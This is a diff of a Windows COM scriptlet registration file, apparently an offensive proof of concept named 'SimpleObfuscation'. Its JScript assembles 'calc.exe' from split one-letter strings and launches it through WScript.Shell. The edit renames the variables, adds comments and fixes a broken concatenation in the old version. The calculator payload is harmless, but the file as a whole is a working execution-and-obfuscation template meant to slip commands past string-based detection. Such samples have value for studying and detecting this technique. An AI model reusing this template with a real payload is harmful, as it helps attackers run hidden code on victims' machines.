@@ -2,20 +2,27 @@
 <scriptlet>
 <registration 
     progid="SimpleObfuscation"
-    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
 	<script language="JScript">
 		<![CDATA[
-	    		var sum='c';
-			var sum1='a';
-			var sum2='l';
-			var sum3='c.';
-			var sum4='.';			
-			var sum5='e';
-			var sum6='x';
-			var sum7='e';
-			var mon=sum+sum1+sum2+sum3+sum4+sum5+sum6+sum7;
-			var r = new ActiveXObject("WScript.Shell");
-			r.Run(mon);
+			// Simple string splitting and reconstruction for command execution
+			var part1 = 'c';
+			var part2 = 'a';
+			var part3 = 'l';
+			var part4 = 'c';
+			var part5 = '.';
+			var part6 = 'e';
+			var part7 = 'x';
+			var part8 = 'e';
+			
+			// Concatenate the parts to form the command
+			var command = part1 + part2 + part3 + part4 + part5 + part6 + part7 + part8;
+			
+			// Dynamically get the WScript.Shell object
+			var shell = new ActiveXObject("WScript.Shell");
+			
+			// Execute the command
+			shell.Run(command);
 		]]>
 	</script>
 </registration>
